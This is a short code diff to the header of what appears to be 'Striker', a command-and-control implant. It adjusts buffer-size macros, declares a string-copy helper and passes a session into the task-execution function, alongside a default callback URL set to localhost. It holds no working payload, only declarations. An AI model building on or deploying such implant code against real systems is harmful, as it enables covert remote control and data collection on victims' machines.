@@ -16,10 +16,10 @@
 // Set to non-zero value for debug outputs.
 #define STRIKER_DEBUG 1
 // The default URL. This is what the patcher will look for.
-#define URL_SIZE 512
+#define URL_SIZE (sizeof(char) * 512)
 char baseURL[URL_SIZE] = "http://localhost:3000";
 // Max task result size in bytes
-#define MAX_RES_SIZE 102400
+#define MAX_RES_SIZE (sizeof(char) * 102400)
 
 /**
  * A struct for working with buffers.
@@ -69,6 +69,10 @@ void resize_buffer(buffer *buff, size_t new_size);
  */
 size_t append_buffer(buffer *dest, const void *src, size_t len);
 
+// Empty `dest` buffer and copy the contents of null-terminated `src` as it's new value.
+// It DOES NOT null-terminate the `dest` buffer.
+size_t buffer_strcpy(buffer *dest, const char *src);
+
 // Convert a buffer to a null-terminated string. Uses the `used` var to determine length.
 char *buffer_to_string(buffer *buff);
 
@@ -95,7 +99,7 @@ cJSON *sysinfo();
 task *parse_task(cJSON *json);
 
 // Execute a task.
-void execute_task(task *t);
+void execute_task(session *striker, task *t);
 
 // Starts the implant.
 void start_session();
